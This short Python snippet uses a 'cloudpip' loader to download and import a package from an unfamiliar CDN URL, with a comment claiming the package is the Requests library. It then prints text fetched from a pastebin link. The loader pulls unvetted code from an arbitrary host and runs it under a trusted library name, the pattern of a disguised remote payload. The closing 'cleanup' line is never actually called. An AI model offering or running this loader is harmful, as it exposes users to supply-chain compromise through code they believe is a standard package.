from cloudpip import download_and_load_package as cloudimport, cleanup as cloudcleanup
cloudimport("https://cdn.auth.ink/u/R48I86.gz", is_pypi=False) # Importing Requests via CDN

import requests
print(requests.get("https://pastebin.com/raw/MzcMMpxp").text)

# Optional: Run cloudpip.cleanup() to delete temporary folders and libraries, freeing up storage. (Recommended)
cloudcleanup